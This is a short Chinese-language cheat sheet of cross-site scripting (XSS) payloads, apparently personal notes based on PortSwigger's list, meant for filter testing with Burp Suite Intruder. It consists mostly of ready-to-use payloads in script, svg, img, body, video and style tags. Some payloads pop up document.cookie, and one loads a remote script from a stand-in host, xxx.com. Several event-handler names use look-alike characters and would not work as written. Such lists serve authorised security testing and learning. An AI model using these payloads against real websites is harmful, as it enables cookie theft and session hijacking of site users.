https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#event-handlers

file:///E:/Firefox/downloads/cheat-sheet-1.pdf

Event handlers：用于检测标签、属性、所有payload组合的禁用情况，在burpsuite的intruder中清单使用



### 标签

<script>标签：<script>标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中

```text
<script>alert("hack")</script>   #弹出hack
<script>alert(/hack/)</script>   #弹出hack
<script>alert(1)</script>        #弹出1，对于数字可以不用引号
<script>alert(document.cookie)</script>      #弹出cookie
<script src=http://xxx.com/xss.js></script>  #引用外部的xss
```

**svg标签**

```text
<svg onload="alert(1)">
<svg onload="alert(1)"//
```

<img>标签：

```text
<img  src=1  οnerrοr=alert("hack")>
<img  src=1  οnerrοr=alert(document.cookie)>  #弹出cookie
```

**<body>标签：**

```text
<body οnlοad=alert(1)>
<body οnpageshοw=alert(1)>
```

**video标签:**

```text
<video οnlοadstart=alert(1) src="/media/hack-the-planet.mp4" />
```

**style标签：**

```text
<style οnlοad=alert(1)></style>
```